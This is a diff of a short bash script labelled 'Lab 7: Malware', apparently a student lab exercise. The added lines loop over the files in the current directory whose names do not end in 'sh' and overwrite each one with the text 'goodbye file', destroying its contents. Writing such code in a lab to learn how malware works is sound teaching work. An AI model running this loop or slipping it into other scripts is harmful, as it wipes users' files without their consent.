@@ -3,8 +3,14 @@
 # Lab 7: Malware
 # Goal: overwrite files
 
-filearray=($(ls | grep -E ".*\..*[^sh]$"))
+#test output
+#ls | grep -E ".*\..*[^sh]$"
 
+filearray=($(ls | grep -E ".*\..*[^sh]$"))
+for key in ${!filearray[@]}
+do
+	echo "goodbye file" > ${filearray[$key]}
+done
 
 
 # works fine for txt files
